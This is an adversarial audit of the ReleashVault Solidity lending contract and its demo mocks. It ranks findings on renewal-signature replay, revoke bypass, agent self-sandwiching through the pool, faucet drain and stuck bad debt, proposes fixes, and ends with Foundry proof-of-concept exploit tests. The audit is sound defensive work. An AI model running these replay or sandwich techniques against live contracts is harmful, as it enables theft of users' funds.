# Adversarial review: ReleashVault + mocks (3 Oct 2026)

Scope: `src/ReleashVault.sol`, `src/mocks/*.sol`, `test/*`, with `agent/keeper.ts` and `agent/src/market.ts` read for how the pool and oracle move in the demo. Every finding marked **PoC** was reproduced with Foundry in a scratch copy of the repo. All PoCs are in the appendix; nothing was added to `test/`.

Ranking: **A** = a contract defect to fix before deploy, **B** = a design limit to fix or disclose, **C** = demo risk or low severity.

---

## A1. A used Renewal can be replayed after `fire()` or an agent change (HIGH, PoC)

`src/ReleashVault.sol:192-195` (`setMandate` sets `lastRenewed = 0`), `:210` (`fire` deletes the mandate), `:224` (`issuedAt > m.lastRenewed`).

Each signature is single-use only because `issuedAt` must be greater than `lastRenewed`. Both `fire()` and an agent change reset `lastRenewed` to 0, so every old signature passes that check again.

Exploit:
1. Alice renews agent A at time T with signature S. S is now public in calldata.
2. Alice fires A and later re-hires A, or switches A → B → A. `lastRenewed` is 0, and SPEC says A "needs a fresh World proof".
3. Anyone, including A, calls `renew(S)` again before `S.deadline`. Authority comes back with no new World proof, and A can `agentBorrow`.

This also works for a signature that was issued but never submitted (`test_poc_unsubmittedRenewalSurvivesFire`).

The existing test `test_changingAgentResetsRenewal` (test/ReleashVault.t.sol:160) only passes because of this bug. Its second `_renew` replays the exact same tuple in the same second.

Exposure is limited by `deadline`. I could not find the backend signer (`backend/src` is empty), so the real deadline is unconfirmed. The test fixture uses 600 s.

## A2. `revoke()` does not cancel outstanding signatures, and `renew` clears `revoked` (MEDIUM, PoC)

`:202-205` (`revoke` only sets the flag), `:228` (`renew` sets `revoked = false`), `:219` (anyone may call `renew`).

Exploit:
1. The backend issues a renewal that is never submitted (UI retry, rejected wallet popup, or the "relayer submits" path).
2. Alice revokes because the agent is misbehaving.
3. Whoever holds the unused signature calls `renew`. `issuedAt > lastRenewed` still holds, `revoked` goes back to false, and the agent borrows.

This breaks the demo line "Revoke: the agent can no longer add debt, instantly."

Who can exploit it: only someone holding an *unsubmitted* signature. Orbit has no public mempool, and a submitted signature is consumed (unless A1 applies). That leaves three realistic holders: a relayer run by the agent operator, backend logs, or a frontend leak. A malicious backend can always sign a fresh renewal anyway, which is already the disclosed trust assumption. The fix is shared with A1 and costs nothing.

### Fix for A1 and A2

About 6 lines. The interface and the `Renewal` struct stay the same, so the backend, agent and web need no change. Verified in scratch: all four replay PoCs now revert with `RenewalNotNewer`, and all 37 existing tests pass with one `vm.warp(block.timestamp + 1)` added before the second `_renew` in `test_changingAgentResetsRenewal`.

```diff
     mapping(address owner => Mandate) public mandates;
+    /// @dev Highest issuedAt ever consumed, or the last revoke/fire/agent-change time. Never reset.
+    mapping(address owner => uint64) public renewalFloor;
 ...
         if (m.agent != agent) {
+            if (m.agent != address(0)) renewalFloor[msg.sender] = uint64(block.timestamp);
             m.agent = agent;
             m.lastRenewed = 0;
 ...
         mandates[msg.sender].revoked = true;
+        renewalFloor[msg.sender] = uint64(block.timestamp);
 ...
         delete mandates[msg.sender];
+        renewalFloor[msg.sender] = uint64(block.timestamp);
 ...
-        require(r.issuedAt > m.lastRenewed, RenewalNotNewer());
+        require(r.issuedAt > m.lastRenewed && r.issuedAt > renewalFloor[r.owner], RenewalNotNewer());
 ...
         m.lastRenewed = r.issuedAt;
+        renewalFloor[r.owner] = r.issuedAt;
```

I chose a floor over a nonce or epoch in the typehash because the floor leaves the signed struct unchanged. SPEC requires an interface change to land in the backend, agent and web together, which is not realistic before deploy.

The backend must follow two rules for this to work:
- Sign `issuedAt = latestBlock.timestamp + 1`, or wall clock clamped to at least that value. Plain `latestBlock.timestamp` does not work: `block.timestamp` has 1 s resolution (RESEARCH.md), so a renewal signed in the same second as a `revoke`, `fire` or agent change equals the floor and fails the strict `>`. The World ID round trip takes seconds, so `+1` is already in the past by the time `renew` lands. Both cases verified in scratch: `issuedAt == revokeTs` reverts, `revokeTs + 1` passes.
- Keep `deadline` short, for example 120 s.

`setMandate` on its first call (agent 0 → A) does not raise the floor, so setMandate followed by renew in the same block still works.

---

## B1. The agent can sandwich its own deleverage, even when revoked. A stale oracle widens it (MEDIUM-HIGH, PoC)

`:257-264`. The agent ceiling is `colIn <= target/oraclePrice * 1.15`. Nothing else limits which pool price the sale executes at, and nothing limits how often it happens.

Exploit with a fresh oracle (`test_poc_agentSandwich`):
1. Revoked agent A dumps 8 rNVDA into the pool.
2. A calls `deleverage(alice, 3000, max)`. The vault sells 16.46 rNVDA against a fair 14.67.
3. A buys back with the same USDG and keeps **+0.88 rNVDA (~$158)** on a 2,640 USDG deleverage, about 6% of the trade.

Exploit with a weekend oracle frozen below the 24/7 pool (`test_poc_agentSandwichStaleLowOracle`):
1. The feed is frozen at 180 while the pool trades at ~216.
2. The ceiling is still computed at 180, so the agent has room for the 15% ceiling plus the staleness gap.
3. The agent gains **+2.35 rNVDA (~$500)** on a 2,400 USDG deleverage, about 20% of the trade.

Across repeated calls, total extraction is roughly (15% + staleness gap) × outstanding debt. If authority is still alive, the agent can re-borrow after each deleverage (USDG goes to the owner, but collateral bleeds on every round trip), and the extraction keeps repeating.

The only defence is `fire()`, which also removes deleverage.

Minimal fixes (pick one):
- Add a per-owner cooldown on agent deleverage, for example 1 per `halfLife`. This bounds repetition. It is a one-line `uint64 lastAgentDeleverage` in `Position` or a separate mapping.
  - Apply it to the agent path only, never the owner.
  - It is a new revert reason on deleverage. It does not come from authority state, so non-negotiable #1 still holds, but say so.
  - It conflicts with the live demo. With a 60 s half-life, the step-5 (Friday close) and step-7 (after revoke) deleverages, or the guard's deleverage10 followed by deleverage30, can land inside one window. Space the beats or use a shorter cooldown.
- Tighten the agent ceiling to about 8%. This only works if the pool is deep enough. The demo's 30% deleverage already costs ~5.6%.

Disclose the remaining extraction in the README trust assumptions.

## B2. During a weekend, a 24/7 pool falling below the frozen oracle blocks agent deleverage (MEDIUM, PoC)

`:261-263`. This is the mirror image of B1. If the pool trades about 13% or more below the frozen feed (a 30% deleverage already uses ~5-6% of the 15% for normal slippage), `colIn > limit` and the agent reverts with `SlippageExceeded`. That happens exactly in the scenario the product exists for: weekend bad news on 24/7 tokenized stock. The owner path still works, but the owner is "offline" by premise.

`test_poc_weekendPoolDropBlocksAgent`: the pool drops ~20% while the feed stays at 180, and agent `deleverage(10%)` reverts.

Non-negotiable #1 ("never revert because of authority state") still technically holds. The product claim does not.

The demo works only because `keeper.ts gap()` calls `setOracle` before `rebalancePool`, in two separate transactions. If the order is reversed, or a mint or `sync` in the loop fails, the agent is blocked.

Fix options:
- When the price is stale, compare against the pool spot price and cap per-call size with B1's cooldown.
- Or disclose: "agent de-risking assumes pool ≈ oracle; owner deleverage is unbounded".

---

## C1. The open faucet lets anyone drain vault liquidity and the pool's USDG (demo risk, PoC)

`src/mocks/MockStock.sol:14`, `MockUSDG.sol:18`. Anyone can mint 1,100 rNVDA, deposit, and `borrow(92,000e6)`, which takes all the vault's USDG. Alice's `borrow` then reverts with `InsufficientLiquidity`.

Dumping a further 1,900 free rNVDA into `MockPool` makes `getAmountIn` revert or exceed the ceiling, so agent deleverage reverts for everyone. The keeper's `tick()` only rebalances while the market is OPEN, so during the WEEKEND beat the pool stays broken.

Judges on a public testnet can do this by accident. Fixes:
- Gate `mint` to faucet amounts per address per day.
- Or have the keeper top up `vault.fund` and rebalance the pool on every run regardless of market state.
- At minimum, run a pre-demo check of vault USDG and pool reserves.

## C2. A capped seize leaves debt with zero collateral that nobody will liquidate (LOW, PoC)

`:288-292`. When `seize > p.collateral`, the liquidator still pays the full `repayAmount` and gets all remaining collateral.

`test_poc_badDebtStuck`: price 80, debt 9,000. After two close-factor liquidations, 2,250 debt sits against ~11.4 rNVDA ($912). A third liquidation leaves **1,125 debt with 0 collateral**, permanently. This is normal for an uninsured lender.

Minimal fix: when capped, reduce the repay to match. Pull `repay = seize * price / VALUE_SCALE * BPS / (BPS + bonus)` so the liquidator never overpays, and disclose that bad debt is socialised to vault funders.

Related: liquidation uses a stale price in both directions. A frozen price that is too low lets liquidators seize at a discount to the true price. SPEC accepts this; disclose it.

## C3. Owner key alone restores agent authority without a World proof (INFO)

`:189-199`. Two paths, both by spec:
- `setMandate(sameAgent, higherBase)` keeps `lastRenewed`, so authority jumps to the new base immediately.
- `setMandate` also clears `revoked`.

This is fine because only the owner can call it. But the pitch "authority to add debt exists only while a human proves presence" is really "while a human proves presence **or the owner key signs**". Word the README carefully.

## C4. MockPool behaviour that skews demo numbers (INFO)

- `rebalancePool` only ever **mints into** the pool and calls `sync`. Every keeper tick (±0.5% every 15 s) deepens the pool permanently, so the "~5% slippage on a 30% deleverage" shrinks the longer the keeper runs. Re-deploy the pool, or reset reserves, before recording.
- `sync()` and `addLiquidity` are permissionless and issue no LP shares. Anyone can move the price for the cost of a donation, which feeds B1 and B2.
- `getAmountIn` has a `+1` and `getAmountOut` rounds down, so `out >= target` holds, which I checked. When `out > target`, deleverage repays slightly more than `bps` of debt. That is harmless, and the event reports the real figure.

---

## Checked and sound

- **Agent borrow ≤ `authorityNow`:** `agentBorrow` compares *total* debt plus amount to authority (`:240-241`). Revoked, never-renewed and zero-agent mandates all give 0 (`:304`). USDG always goes to the owner (`:363`). The agent cannot route funds to itself.
- **Fired agent / stranger:** `deleverage` checks `msg.sender == mandates[owner].agent && != 0`. After `fire` the agent is 0, so the call reverts with `NotOwnerOrAgent`.
- **Signature domain:** the EIP-712 domain includes chainId and the vault address. OZ re-derives it after a fork. `owner` is in the struct. Cross-vault and cross-chain replay fail (existing test). `ECDSA.tryRecover` rejects high-s and bad `v`, and replay protection does not depend on the signature bytes, so malleability does not matter.
- **`limitAt`:** shift ≤ 2 because `periods < 3`. `halved * (elapsed % halfLife)` cannot overflow for vault state, because `base ≤ uint128` and `rem < halfLife`. The public view with an arbitrary `uint256 base` can revert on overflow, which is harmless. The curve is continuous at each halving (value reaches `halved/2` as rem → halfLife). The constructor rejects `halfLife = 0`. `issuedAt ≤ block.timestamp` prevents underflow in `authorityNow`.
- **Deleverage cannot be blocked by authority:** it reads only `mandates[owner].agent`. The owner path never reads the oracle, so a stale or bad price cannot block it. The agent path reads `_price()`, not `_freshPrice()`. A stale price only matters through B2.
- **Deleverage cannot make a healthy position liquidatable:** at the worst agent fill (1.15 × oracle), LTV gets worse only when LTV > 1/1.15 ≈ 87%, which is already liquidatable.
- **Deleverage to zero collateral:** `colIn <= p.collateral` is enforced before the swap. A deeply underwater position simply reverts and stays liquidatable. Debt under 10 units makes `target = 0`, which reverts with `NoDebt`. The owner repays dust.
- **CEI / reentrancy:** every fund-moving function is `nonReentrant`. State is written before external transfers in `withdraw`, `deposit`, `repay`, `liquidate` and `_borrow`. In `deleverage` the pool call comes after `p.collateral -=`, and the debt update follows the swap, which is safe under the guard and an immutable pool. `forceApprove(colIn)` is exact. The surplus transfer (`:272`) fires only when `out > debt`.
- **Decimals:** 18-decimal collateral × 8-decimal price / 1e20 = 6-decimal USDG, correct. `fair = target·1e20/price` gives 18-decimal collateral, correct. LTV checks cross-multiply on a rounded-down value, so rounding is conservative for borrow and slightly favours liquidation. `toUint128` is safe on every path. `+=` on `uint128` is checked.
- **Liquidation math:** the close factor is enforced against the current debt. Repeated calls are allowed, which is standard. Seize = repay/price × 1.05, with division before the bonus losing less than 1 wei. The liquidator cannot take more than 5% over oracle. Liquidation improves LTV whenever LTV < 1/1.05 ≈ 95%.
- **No admin:** the vault has no owner, and its immutables cannot be changed. Non-negotiable #3 holds.

## Testing gaps

- The invariant handler's `_syncPool` keeps the pool pinned to the oracle, so pool/oracle divergence (B1, B2) is never exercised. Add a handler action that moves the pool alone.
- No test covers fire → re-hire → renew, or revoke followed by renewing with an older signature (A1, A2).
- `test_changingAgentResetsRenewal` encodes the replay. Update it alongside the fix.

---

## Appendix: PoC (`test/PoC.t.sol` in a scratch copy, not committed)

Against the current `src/`: 9/9 pass, which demonstrates every issue. With the A1/A2 fix: the four `renewal*` / `pendingRenewal*` / `unsubmitted*` tests revert with `RenewalNotNewer`, which is the expected result.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Base} from "./Base.t.sol";
import {ReleashVault} from "../src/ReleashVault.sol";

contract PoC is Base {
    address agent2 = makeAddr("agent2");

    // F1: a consumed renewal is replayable after fire / agent switch, because lastRenewed is reset to 0.
    function test_poc_renewalReplayAfterFire() public {
        _open(alice, 100e18, 0);
        _mandate(alice, 9_000e6);
        ReleashVault.Renewal memory r = _renewal(alice, uint64(block.timestamp));
        bytes memory sig = _sign(r, signerPk);
        vault.renew(r, sig); // consumed
        vm.expectRevert(ReleashVault.RenewalNotNewer.selector);
        vault.renew(r, sig); // single-use... for now

        vm.warp(block.timestamp + 30);
        vm.startPrank(alice);
        vault.fire();
        vault.setMandate(agent, 9_000e6); // re-hire: spec says "needs a fresh World proof"
        vm.stopPrank();
        assertEq(vault.authorityNow(alice), 0);

        vm.prank(agent); // the agent itself replays the old, already-used signature from calldata
        vault.renew(r, sig);
        assertGt(vault.authorityNow(alice), 0, "authority restored without a fresh World proof");
        vm.prank(agent);
        vault.agentBorrow(alice, 5_000e6);
    }

    // F1b: same via switching agent A -> B -> A.
    function test_poc_renewalReplayAfterAgentSwap() public {
        _open(alice, 100e18, 0);
        _mandate(alice, 9_000e6);
        ReleashVault.Renewal memory r = _renewal(alice, uint64(block.timestamp));
        bytes memory sig = _sign(r, signerPk);
        vault.renew(r, sig);
        vm.startPrank(alice);
        vault.setMandate(agent2, 9_000e6);
        vault.setMandate(agent, 9_000e6);
        vm.stopPrank();
        vault.renew(r, sig);
        assertGt(vault.authorityNow(alice), 0);
    }

    // F2: an unsubmitted renewal undoes a revoke (renew is permissionless and clears `revoked`).
    function test_poc_pendingRenewalUndoesRevoke() public {
        _open(alice, 100e18, 0);
        _mandate(alice, 9_000e6);
        _renew(alice);
        vm.warp(block.timestamp + 10);
        // backend issued a second renewal (e.g. a retried/abandoned UI submit); it leaks / sits unused
        ReleashVault.Renewal memory r2 = _renewal(alice, uint64(block.timestamp));
        bytes memory sig2 = _sign(r2, signerPk);
        vm.warp(block.timestamp + 5);
        vm.prank(alice);
        vault.revoke();
        assertEq(vault.authorityNow(alice), 0);
        vm.prank(agent);
        vault.renew(r2, sig2);
        vm.prank(agent);
        vault.agentBorrow(alice, 5_000e6); // borrows after the owner revoked
    }

    // F3: agent sandwiches its own deleverage through the pool, within the 15% ceiling.
    function test_poc_agentSandwich() public {
        _open(alice, 100e18, 8_800e6);
        _mandate(alice, 9_000e6);
        vm.prank(alice);
        vault.revoke(); // even revoked
        _mintNvda(agent, 30e18);
        uint256 usdBefore = usdg.balanceOf(agent);
        uint256 nvdaBefore = nvda.balanceOf(agent);
        uint128 colBefore = _col(alice);

        vm.startPrank(agent);
        nvda.approve(address(pool), type(uint256).max);
        usdg.approve(address(pool), type(uint256).max);
        // front-run: push pool price down so the vault's sale lands right under the 15% ceiling
        uint256 out1 = pool.swapExactIn(address(nvda), 8e18, 0, agent);
        vault.deleverage(alice, 3_000, type(uint128).max);
        // back-run: buy the rNVDA back
        pool.swapExactIn(address(usdg), out1, 0, agent);
        vm.stopPrank();

        uint256 sold = colBefore - _col(alice);
        uint256 fair = uint256(8_800e6 * 3 / 10) * 1e20 / 180e8;
        emit log_named_uint("vault sold (1e18)", sold);
        emit log_named_uint("fair (1e18)", fair);
        emit log_named_int("agent rNVDA gain (1e18)", int256(nvda.balanceOf(agent)) - int256(nvdaBefore));
        emit log_named_int("agent USDG gain (1e6)", int256(usdg.balanceOf(agent)) - int256(usdBefore));
        assertGt(nvda.balanceOf(agent), nvdaBefore, "agent profits");
    }

    // F4: weekend: oracle frozen, pool (24/7) falls >13%: the agent cannot de-risk at all.
    function test_poc_weekendPoolDropBlocksAgent() public {
        _open(alice, 100e18, 8_800e6);
        _mandate(alice, 9_000e6);
        vm.warp(block.timestamp + 2 days);
        // pool trades down ~20% while the feed is frozen at 180
        (uint256 r0, uint256 r1) = pool.reserves();
        _mintNvda(address(pool), r0 * 25 / 100);
        pool.sync();
        vm.prank(agent);
        vm.expectRevert();
        vault.deleverage(alice, 1_000, type(uint128).max);
        r1;
    }

    // F5: open faucet mint drains vault liquidity and pool USDG; deleverage then reverts for everyone.
    function test_poc_faucetDrain() public {
        _open(alice, 100e18, 8_000e6);
        _mandate(alice, 9_000e6);
        _mintNvda(bob, 3_000e18);
        vm.startPrank(bob);
        nvda.approve(address(vault), type(uint256).max);
        nvda.approve(address(pool), type(uint256).max);
        vault.deposit(1_100e18);
        vault.borrow(92_000e6); // free-minted rNVDA borrows every USDG the vault holds
        pool.swapExactIn(address(nvda), 1_900e18, 0, bob);
        vm.stopPrank();
        vm.prank(alice);
        vm.expectRevert(ReleashVault.InsufficientLiquidity.selector);
        vault.borrow(1e6);
        vm.prank(agent);
        vm.expectRevert();
        vault.deleverage(alice, 3_000, type(uint128).max);
    }

    // F6: liquidation when seize is capped: liquidator pays full repay, debt left with 0 collateral.
    function test_poc_badDebtStuck() public {
        _open(bob, 100e18, 9_000e6);
        _setPrice(80e8); // value 8,000 < debt 9,000
        vm.prank(liquidator);
        vault.liquidate(bob, 4_500e6); // seize capped? 4500/80*1.05 = 59 rNVDA, not capped
        vm.prank(liquidator);
        vault.liquidate(bob, 2_250e6); // 29.5 rNVDA
        vm.prank(liquidator);
        vault.liquidate(bob, 1_125e6); // wants 14.8 rNVDA, gets what is left
        emit log_named_uint("col left", _col(bob));
        emit log_named_uint("debt left", _debt(bob));
    }

    // F1c: an UNSUBMITTED renewal outlives fire + re-hire.
    function test_poc_unsubmittedRenewalSurvivesFire() public {
        _open(alice, 100e18, 0);
        _mandate(alice, 9_000e6);
        _renew(alice);
        vm.warp(block.timestamp + 5);
        ReleashVault.Renewal memory r2 = _renewal(alice, uint64(block.timestamp));
        bytes memory sig2 = _sign(r2, signerPk);
        vm.warp(block.timestamp + 5);
        vm.startPrank(alice);
        vault.fire();
        vault.setMandate(agent, 9_000e6);
        vm.stopPrank();
        vault.renew(r2, sig2);
        assertGt(vault.authorityNow(alice), 0);
    }

    // F3b: stale oracle BELOW the 24/7 pool widens the agent's extraction room.
    function test_poc_agentSandwichStaleLowOracle() public {
        _open(alice, 100e18, 8_000e6);
        _mandate(alice, 9_000e6);
        // weekend: feed frozen at 180, pool trades up ~20% to ~216
        (uint256 r0,) = pool.reserves();
        _mintUsdg(address(pool), 10_000e6);
        pool.sync();
        r0;
        _mintNvda(agent, 60e18);
        uint256 nvdaBefore = nvda.balanceOf(agent);
        uint128 colBefore = _col(alice);
        vm.startPrank(agent);
        nvda.approve(address(pool), type(uint256).max);
        usdg.approve(address(pool), type(uint256).max);
        uint256 out1 = pool.swapExactIn(address(nvda), 28e18, 0, agent);
        vault.deleverage(alice, 3_000, type(uint128).max);
        pool.swapExactIn(address(usdg), out1, 0, agent);
        vm.stopPrank();
        uint256 sold = colBefore - _col(alice);
        emit log_named_uint("vault sold (1e18)", sold);
        emit log_named_int("agent rNVDA gain (1e18)", int256(nvda.balanceOf(agent)) - int256(nvdaBefore));
    }
}
```
